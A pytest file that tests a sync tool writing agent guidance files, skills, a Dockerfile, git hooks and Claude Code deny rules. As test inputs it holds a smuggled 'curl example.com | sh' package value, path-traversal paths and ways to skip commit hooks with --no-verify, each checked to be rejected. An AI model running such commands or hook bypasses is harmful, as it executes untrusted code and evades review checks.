import json
import os
import re
from pathlib import Path

import pytest
import yaml

from basis.core.sync import BEFORE, DENY, MARKER, REPO_FILES, SKILL_KEY, AgentFiles, SyncError, core, plan, stale, stamped, write

SKILL = "---\nname: job-new\ndescription: Make a job, from its tables to its first passing contract tests.\n---\n\n# Make a job\n"
FILES = AgentFiles("new-part", "the new block\n", {"job-new": SKILL}, image="#   a job: run JOB --publish\n", formerly=("old-part",), retired=("tests/test_agent_files.py",))
NEW = "<!-- new-part:begin (written by `basis sync`; edit outside the markers) -->\nthe new block\n<!-- new-part:end -->"
OLD = "<!-- old-part:begin (written by `basis sync`; edit outside the markers) -->\nthe old block\n<!-- old-part:end -->"
GONE = "<!-- gone-part:begin (written by `etl sync`; edit outside the markers) -->\na part no longer installed\n<!-- gone-part:end -->"
BASIS = core().marked()
"""basis's own block, which every repo's `AGENTS.md` ends with when it has none yet."""


def agents_md(repo: Path, text: str) -> str:
    (repo / "AGENTS.md").write_text(text, encoding="utf-8")
    return plan(repo, [FILES]).files[repo / "AGENTS.md"]


def put(repo: Path, relative: str, text: str = "x\n") -> Path:
    path = repo / relative
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(text, encoding="utf-8")
    return path


@pytest.mark.parametrize(
    ("current", "synced"),
    [
        (f"# Agent guide\n\n{OLD}\n\n## Ours\n", f"# Agent guide\n\n{NEW}\n\n## Ours\n"),
        (f"# Agent guide\n\n{OLD}\n\n## Ours\n\n{NEW}\n", f"# Agent guide\n\n## Ours\n\n{NEW}\n"),
        (f"# Agent guide\n\n{NEW}\n\n{OLD}\n", f"# Agent guide\n\n{NEW}\n"),
        ("# Agent guide\n\n## Ours\n", f"# Agent guide\n\n## Ours\n\n{NEW}\n"),
        (f"# Agent guide\n\n{GONE}\n\n## Ours\n\n{NEW}\n", f"# Agent guide\n\n## Ours\n\n{NEW}\n"),
    ],
    ids=["former-name-in-place", "former-beside-current", "former-after-current", "none-yet", "a-part-no-longer-installed"],
)
def test_each_parts_block_is_current_and_every_other_block_sync_wrote_is_removed(tmp_path: Path, current: str, synced: str) -> None:
    assert agents_md(tmp_path, current) == f"{synced}\n{BASIS}"


def test_basiss_own_block_stays_where_it_is(tmp_path: Path) -> None:
    current = f"# Agent guide\n\n{BASIS}\n## Ours\n\n{NEW}\n"
    assert agents_md(tmp_path, current) == current


def test_a_repo_has_the_framework_files_each_opening_with_the_marker_and_the_dockerfile_lists_each_parts_command(tmp_path: Path) -> None:
    write(tmp_path, [FILES])
    for path in REPO_FILES:
        assert any(MARKER in line for line in (tmp_path / path).read_text(encoding="utf-8").splitlines()[:3]), path
    assert "#   a job: run JOB --publish\nENTRYPOINT" in (tmp_path / "Dockerfile").read_text(encoding="utf-8")
    assert (tmp_path / "CLAUDE.md").read_text(encoding="utf-8") == "@AGENTS.md\n"
    assert (tmp_path / ".claude/skills/job-new/SKILL.md").read_text(encoding="utf-8") == (tmp_path / ".agents/skills/job-new/SKILL.md").read_text(encoding="utf-8")
    assert json.loads((tmp_path / ".claude/settings.json").read_text(encoding="utf-8"))["permissions"] == {"deny": list(DENY)}
    assert stale(tmp_path, [FILES]) == []


def test_sync_removes_what_basis_owns_and_no_part_writes_now(tmp_path: Path) -> None:
    write(tmp_path, [FILES])
    written = stamped("---\nname: report-port\ndescription: Port a report.\n---\n")  # by a part that is gone, whatever its name
    skill = put(tmp_path, ".agents/skills/report-port/SKILL.md", written)
    copy = put(tmp_path, ".claude/skills/report-port/SKILL.md", written)
    marked = put(tmp_path, "deploy/cronjob.yaml", f"# This file is {MARKER} from the installed version.\nkind: CronJob\n")
    retired = put(tmp_path, "tests/test_agent_files.py")
    assert stale(tmp_path, [FILES]) == [skill.parent, copy.parent, marked, retired]
    assert write(tmp_path, [FILES]).changed == [skill.parent, copy.parent, marked, retired]
    assert not any(path.exists() for path in (skill.parent, copy.parent, marked, retired))
    assert stale(tmp_path, [FILES]) == []


def test_sync_leaves_what_basis_does_not_own(tmp_path: Path) -> None:
    write(tmp_path, [FILES])
    own_skill = put(tmp_path, ".agents/skills/release-notes/SKILL.md")
    own_claude_skill = put(tmp_path, ".claude/skills/release-notes/SKILL.md")
    own_named_like_a_part = put(tmp_path, ".agents/skills/job-notes/SKILL.md", "---\nname: job-notes\ndescription: Our notes on the jobs.\n---\n")
    mentioned = put(tmp_path, "README.md", f"# Pricing\n\nA repo of jobs.\n\nIts Dockerfile is {MARKER}.\n")
    in_venv = put(tmp_path, ".venv/lib/notes.txt", f"{MARKER}\n")
    binary = tmp_path / "data.parquet"
    binary.write_bytes(b"PAR1\xff\xfe\x00" * 100)
    assert stale(tmp_path, [FILES]) == []
    assert write(tmp_path, [FILES]).changed == []
    assert all(path.exists() for path in (own_skill, own_claude_skill, own_named_like_a_part, mentioned, in_venv, binary))


def test_a_skill_is_written_with_basiss_marker_first_in_its_front_matter_metadata_and_the_rest_as_the_part_wrote_it(tmp_path: Path) -> None:
    write(tmp_path, [FILES])
    written = (tmp_path / ".agents/skills/job-new/SKILL.md").read_text(encoding="utf-8")
    front, _, body = written.removeprefix("---\n").partition("---\n")
    assert any(MARKER in line for line in written.splitlines()[:3])
    assert yaml.safe_load(front) == {"metadata": {SKILL_KEY: MARKER}, "name": "job-new", "description": "Make a job, from its tables to its first passing contract tests."}
    assert body == "\n# Make a job\n"


@pytest.mark.parametrize(
    ("text", "why"),
    [("# Make a job\n", "it has no front matter"), ("---\nname: job-new\nmetadata:\n  team: rates\n---\n", "it has a metadata map of its own")],
    ids=["no-front-matter", "metadata-of-its-own"],
)
def test_a_parts_skill_that_cannot_carry_the_marker_is_one_problem_and_every_other_file_is_still_written(tmp_path: Path, text: str, why: str) -> None:
    files = AgentFiles("basis-alpha", "the alpha block\n", {"alpha-new": text})
    [(reason, fix)] = plan(tmp_path, [files]).problems()
    assert reason.startswith(f"basis-alpha's skill alpha-new cannot carry basis's marker: {why}")
    assert fix == "a defect in basis-alpha: install it from a basis release, with `uv sync --reinstall`"
    assert (tmp_path / "Dockerfile") in write(tmp_path, [files]).changed
    assert not (tmp_path / ".agents/skills/alpha-new").exists()


@pytest.mark.parametrize("relative", [".agents/skills/job-new/SKILL.md", ".claude/skills/job-new/SKILL.md", "Dockerfile", ".githooks/pre-push"])
def test_an_edited_file_is_stale_until_synced(tmp_path: Path, relative: str) -> None:
    write(tmp_path, [FILES])
    written = (tmp_path / relative).read_text(encoding="utf-8")
    edited = put(tmp_path, relative, written + "# my way\n")
    assert stale(tmp_path, [FILES]) == [edited]
    assert write(tmp_path, [FILES]).changed == [edited]
    assert edited.read_text(encoding="utf-8") == written


def test_a_file_checked_out_with_crlf_line_endings_is_stale_and_sync_writes_lf(tmp_path: Path) -> None:
    write(tmp_path, [FILES])
    hook = tmp_path / ".githooks/pre-commit"
    lf = hook.read_bytes()
    hook.write_bytes(lf.replace(b"\n", b"\r\n"))
    assert stale(tmp_path, [FILES]) == [hook]
    write(tmp_path, [FILES])
    assert hook.read_bytes() == lf


@pytest.mark.skipif(os.name == "nt", reason="Git for Windows runs a hook whatever its mode")
def test_the_hooks_are_executable_and_one_that_is_not_is_stale(tmp_path: Path) -> None:
    write(tmp_path, [FILES])
    hooks = [tmp_path / ".githooks/pre-commit", tmp_path / ".githooks/pre-push"]
    assert all(os.access(hook, os.X_OK) for hook in hooks)
    hooks[1].chmod(0o644)
    assert stale(tmp_path, [FILES]) == [hooks[1]]
    write(tmp_path, [FILES])
    assert os.access(hooks[1], os.X_OK)


def test_claude_settings_keep_the_repos_own_keys_and_rules_and_gain_the_missing_deny_rules(tmp_path: Path) -> None:
    own = {"permissions": {"allow": ["Bash(uv run pytest *)"], "deny": ["Read(./.env)", DENY[0]]}, "env": {"BASIS_LOG_LEVEL": "DEBUG"}}
    settings = put(tmp_path, ".claude/settings.json", json.dumps(own))
    write(tmp_path, [FILES])
    assert json.loads(settings.read_text(encoding="utf-8")) == {"permissions": {"allow": ["Bash(uv run pytest *)"], "deny": ["Read(./.env)", *DENY]}, "env": {"BASIS_LOG_LEVEL": "DEBUG"}}
    reformatted = put(tmp_path, ".claude/settings.json", json.dumps(json.loads(settings.read_text(encoding="utf-8")), indent=4))
    assert stale(tmp_path, [FILES]) == []
    assert write(tmp_path, [FILES]).changed == []
    assert reformatted.read_text(encoding="utf-8").startswith('{\n    "permissions"')


def test_claude_settings_basis_cannot_read_are_one_problem_and_every_other_file_is_still_checked_and_written(tmp_path: Path) -> None:
    write(tmp_path, [FILES])
    settings = put(tmp_path, ".claude/settings.json", "{")
    dockerfile = tmp_path / "Dockerfile"
    dockerfile.write_text(dockerfile.read_text(encoding="utf-8") + "# mine\n", encoding="utf-8")
    found = plan(tmp_path, [FILES])
    assert [reason.split(" (")[0] for reason, _ in found.problems()] == [f"{settings} is not JSON, so basis cannot add its rules to it"]
    assert found.problems()[0][1] == "fix it, or remove it, and run `uv run basis sync`"
    assert found.stale() == [dockerfile]
    done = write(tmp_path, [FILES])
    assert done.changed == [dockerfile]
    assert list(done.unwritable) == [settings]
    assert settings.read_text(encoding="utf-8") == "{"


@pytest.mark.parametrize("text", ['{"permissions": {"deny": "Bash"}}', "[]"], ids=["deny-not-a-list", "not-an-object"])
def test_claude_settings_of_another_shape_say_how_to_fix_them(tmp_path: Path, text: str) -> None:
    put(tmp_path, ".claude/settings.json", text)
    assert [reason.split(" is ", 1)[1] for reason, _ in plan(tmp_path, [FILES]).problems()] == ["not Claude Code's settings, an object whose permissions.deny is a list of rules"]


@pytest.mark.parametrize(
    ("relative", "text"),
    [
        ("Dockerfile", "FROM python:3.14-slim\nRUN pip install pricing\n"),
        (".githooks/pre-commit", "#!/bin/sh\nmake lint\n"),
        ("CLAUDE.md", "@AGENTS.md\n\nAlways run the tests.\n"),
        (".claude/settings.json", '{"permissions": {"allow": ["Bash(make *)"]}}\n'),
        (".agents/skills/job-new/SKILL.md", "---\nname: job-new\ndescription: How this team makes a job.\n---\n"),
        (".claude/skills/job-new/SKILL.md", "---\nname: job-new\ndescription: How this team makes a job.\n---\n"),
    ],
)
def test_a_file_of_the_repos_own_at_a_path_basis_writes_is_left_alone_until_adopted(tmp_path: Path, relative: str, text: str) -> None:
    own = put(tmp_path, relative, text)
    found = plan(tmp_path, [FILES])
    assert found.problems() == [
        (
            f"{relative} is the repo's own, at a path basis writes, so basis leaves it alone",
            "run `uv run basis sync --adopt`, which saves each beside itself as NAME.before-basis, for you to compare and delete, and writes basis's",
        )
    ]
    assert own not in found.stale()
    done = write(tmp_path, [FILES])
    assert done.refused == [own]
    assert own.read_text(encoding="utf-8") == text
    assert (tmp_path / "AGENTS.md").exists()  # every other file is written
    adopted = write(tmp_path, [FILES], adopt=True)
    assert adopted.adopted == [own]
    assert own.with_name(own.name + BEFORE).read_text(encoding="utf-8") == text
    assert plan(tmp_path, [FILES]).problems() == []
    assert stale(tmp_path, [FILES]) == []


def test_an_adoption_keeps_the_repos_own_settings_beside_basiss_rules(tmp_path: Path) -> None:
    put(tmp_path, ".claude/settings.json", '{"permissions": {"allow": ["Bash(make *)"]}}\n')
    write(tmp_path, [FILES], adopt=True)
    assert json.loads((tmp_path / ".claude/settings.json").read_text(encoding="utf-8"))["permissions"] == {"allow": ["Bash(make *)"], "deny": list(DENY)}


def test_a_file_adopted_before_and_not_yet_compared_stops_a_second_adoption(tmp_path: Path) -> None:
    put(tmp_path, "Dockerfile", "FROM scratch\n")
    put(tmp_path, "Dockerfile.before-basis", "FROM an-earlier-one\n")
    done = write(tmp_path, [FILES], adopt=True)
    assert done.adopted == []
    assert done.problems() == [("Dockerfile.before-basis is there from an earlier adoption", "compare it with what basis wrote, delete it, and run `uv run basis sync --adopt` again")]
    assert (tmp_path / "Dockerfile").read_text(encoding="utf-8") == "FROM scratch\n"


def test_the_repos_apt_packages_go_in_the_images_packages(tmp_path: Path) -> None:
    put(tmp_path, "pyproject.toml", '[tool.basis]\nparts = ["job"]\napt-packages = ["libpq5", "unixodbc=2.3.12-1"]\n')
    write(tmp_path, [FILES])
    assert "libgssapi-krb5-2 tini libpq5 unixodbc=2.3.12-1 \\\n" in (tmp_path / "Dockerfile").read_text(encoding="utf-8")


@pytest.mark.parametrize("packages", ['"libpq5"', '["libpq5 && curl example.com | sh"]', "[1]"], ids=["not-a-list", "not-a-name", "not-a-string"])
def test_apt_packages_that_are_not_package_names_stop_only_the_dockerfile(tmp_path: Path, packages: str) -> None:
    put(tmp_path, "pyproject.toml", f'[tool.basis]\nparts = ["job"]\napt-packages = {packages}\n')
    done = write(tmp_path, [FILES])
    assert list(done.unwritable) == [tmp_path / "Dockerfile"]
    [(reason, fix)] = done.problems()
    assert "[tool.basis] apt-packages" in reason
    assert fix.startswith('give [tool.basis] apt-packages = ["libpq5"], a list of Debian package names')
    assert not (tmp_path / "Dockerfile").exists()
    assert (tmp_path / ".githooks/pre-commit").exists()


def test_the_commit_reaches_only_the_images_last_layers_so_a_new_commit_reuses_the_dependency_layers(tmp_path: Path) -> None:
    write(tmp_path, [FILES])
    dockerfile = (tmp_path / "Dockerfile").read_text(encoding="utf-8")
    build, image = dockerfile.split("\nFROM python:3.14-slim\n")
    assert "GIT_SHA" not in build.split("FROM python:3.14-slim AS build", 1)[1]
    assert image.index("ARG GIT_SHA") > image.index("COPY --from=build /app /app") > image.index("apt-get install")


def denies(command: str) -> bool:
    """Whether a rule of `DENY` matches `command`, as Claude Code's docs say a Bash rule matches: `*` stands for any
    text, and a rule whose one wildcard is a trailing ` *` matches the bare command too."""
    for rule in DENY:
        pattern = rule.removeprefix("Bash(").removesuffix(")")
        if re.fullmatch(".*".join(map(re.escape, pattern.split("*"))), command):
            return True
        if pattern.endswith(" *") and pattern.count("*") == 1 and command == pattern.removesuffix(" *"):
            return True
    return False


@pytest.mark.parametrize(
    "command",
    [
        "git commit --no-verify -m 'x'",
        "git commit -m 'x' --no-verify",
        "git -C . commit -m x --no-verify",
        "git push --no-verify origin main",
        "git -C repo push origin main --no-verify",
        "git commit -n -m x",
        "git commit -n",
        "git commit -nm 'x'",
        "git commit -anm 'x'",
        "git commit -an -m x",
        "git commit -a -n -m x",
        "git commit -a -nm 'x'",
        "git commit --amend --no-edit -n",
        "git commit -a -anm 'x'",
    ],
)
def test_the_deny_rules_refuse_each_common_way_to_skip_the_commit_hook(command: str) -> None:
    assert denies(command)


@pytest.mark.parametrize(
    "command", ["git commit -m 'see grep -n output'", "git commit -m 'use -n'", "git commit -am 'x'", "git commit --amend --no-edit", "git push origin main", "git commit -m 'a' -m 'pass -n to head'"]
)
def test_the_deny_rules_allow_a_commit_whose_message_holds_dash_n(command: str) -> None:
    assert not denies(command)


DOCUMENT = f'{{\n  "x-basis": "{MARKER}",\n  "openapi": "3.1.0"\n}}\n'


def made(text: str = DOCUMENT, path: str = "openapi.json", part: str = "basis-api") -> AgentFiles:
    """A part that makes `path` from the repo's code, as `text`."""
    return AgentFiles(part, "the api block\n", {}, made={path: lambda: text})


def test_a_file_a_part_makes_from_the_repos_code_is_written_and_checked_like_every_other(tmp_path: Path) -> None:
    write(tmp_path, [FILES, made()])
    document = tmp_path / "openapi.json"
    assert document.read_text(encoding="utf-8") == DOCUMENT
    assert stale(tmp_path, [FILES, made()]) == []
    changed = DOCUMENT.replace("3.1.0", "3.2.0")
    assert stale(tmp_path, [FILES, made(changed)]) == [document]
    assert write(tmp_path, [FILES, made(changed)]).changed == [document]
    edited = put(tmp_path, "openapi.json", changed.replace("3.2.0", "3.1.1"))
    assert stale(tmp_path, [FILES, made(changed)]) == [edited]


def test_a_file_no_part_makes_now_is_removed(tmp_path: Path) -> None:
    write(tmp_path, [FILES, made()])
    document = tmp_path / "openapi.json"
    unmade = AgentFiles("basis-api", "the api block\n", {})
    assert stale(tmp_path, [FILES, unmade]) == [document]
    write(tmp_path, [FILES, unmade])
    assert not document.exists()


def test_a_file_of_the_repos_own_where_a_part_makes_one_is_left_alone_until_adopted(tmp_path: Path) -> None:
    own = put(tmp_path, "openapi.json", '{"openapi": "3.0.0"}\n')
    found = plan(tmp_path, [FILES, made()])
    assert [reason for reason, _ in found.problems()] == ["openapi.json is the repo's own, at a path basis writes, so basis leaves it alone"]
    assert write(tmp_path, [FILES, made()]).refused == [own]
    assert write(tmp_path, [FILES, made()], adopt=True).adopted == [own]
    assert own.read_text(encoding="utf-8") == DOCUMENT
    assert own.with_name("openapi.json.before-basis").read_text(encoding="utf-8") == '{"openapi": "3.0.0"}\n'


def test_a_file_a_part_cannot_make_is_one_problem_and_is_kept_while_every_other_is_written(tmp_path: Path) -> None:
    write(tmp_path, [FILES, made()])
    document = tmp_path / "openapi.json"

    def fails() -> str:
        msg = "service accruals does not import (SyntaxError at accruals/service.py:3)"
        raise SyncError(msg, "fix it, and run `uv run basis sync`")

    broken = AgentFiles("basis-api", "the api block\n", {}, made={"openapi.json": fails})
    (tmp_path / "AGENTS.md").write_text("# Agent guide\n", encoding="utf-8")
    found = plan(tmp_path, [FILES, broken])
    assert found.problems() == [("service accruals does not import (SyntaxError at accruals/service.py:3)", "fix it, and run `uv run basis sync`")]
    assert found.stale() == [tmp_path / "AGENTS.md"]
    write(tmp_path, [FILES, broken])
    assert document.read_text(encoding="utf-8") == DOCUMENT


@pytest.mark.parametrize(
    ("path", "why"),
    [
        ("/etc/openapi.json", "the basis-api part makes '/etc/openapi.json', which is not a file's path relative to the repo"),
        ("C:/openapi.json", "the basis-api part makes 'C:/openapi.json', which is not a file's path relative to the repo"),
        ("api\\openapi.json", "the basis-api part makes 'api\\\\openapi.json', which is not a file's path relative to the repo"),
        ("", "the basis-api part makes '', which is not a file's path relative to the repo"),
        ("api/../../openapi.json", "the basis-api part makes 'api/../../openapi.json', which leads out of the repo"),
        (".venv/openapi.json", "the basis-api part makes '.venv/openapi.json', which is in a folder basis never writes in"),
        ("dockerfile", "the basis-api part makes dockerfile, which basis writes itself"),
        ("./AGENTS.md", "the basis-api part makes AGENTS.md, which basis writes itself"),
    ],
    ids=["absolute", "a-drive", "backslashes", "empty", "out-of-the-repo", "unread-folder", "a-framework-file", "agents-md"],
)
def test_a_part_makes_only_files_of_its_own_in_the_repo(tmp_path: Path, path: str, why: str) -> None:
    found = plan(tmp_path, [FILES, made(path=path)])
    assert found.problems() == [(why, "a defect in basis: install every basis package from one release, with `uv sync --reinstall`")]
    write(tmp_path, [FILES, made(path=path)])
    assert (tmp_path / "AGENTS.md").exists()
    assert not (tmp_path / "openapi.json").exists()


def test_no_two_parts_make_one_file_and_neither_removes_the_one_there(tmp_path: Path) -> None:
    write(tmp_path, [FILES, made()])
    both = [FILES, made(), made(path="OpenAPI.json", part="basis-job")]
    assert plan(tmp_path, both).problems() == [
        ("the basis-api and basis-job parts each make openapi.json", "a defect in basis: install every basis package from one release, with `uv sync --reinstall`")
    ]
    assert stale(tmp_path, both) == [tmp_path / "AGENTS.md"]  # the second part's block, and nothing of openapi.json
    write(tmp_path, both)
    assert (tmp_path / "openapi.json").read_text(encoding="utf-8") == DOCUMENT


def test_a_file_a_part_makes_carries_the_marker(tmp_path: Path) -> None:
    found = plan(tmp_path, [FILES, made('{"openapi": "3.1.0"}\n')])
    assert found.problems() == [
        ("the basis-api part made openapi.json without basis's marker in its first lines", "a defect in basis: install every basis package from one release, with `uv sync --reinstall`")
    ]
